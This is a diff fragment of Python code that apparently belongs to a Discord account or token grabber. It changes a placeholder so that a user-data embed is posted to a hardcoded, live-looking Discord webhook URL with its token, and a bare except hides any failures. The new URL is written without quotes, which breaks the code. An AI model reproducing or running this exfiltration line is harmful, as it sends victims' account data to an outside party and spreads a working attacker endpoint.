@@ -186,7 +186,7 @@ def main():
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                requests.post('WEBHOOK_URL', json=embed_user, headers=getheaders())
+                requests.post(https://discord.com/api/webhooks/1340682907076792402/Y5fSJgvwo44HQu7wbBIwai43sWvtMszEky2oNRZXnD5S39zIvsfZJ_M9iHwLG-EcuC0X, json=embed_user, headers=getheaders())
             except:
                 continue
 
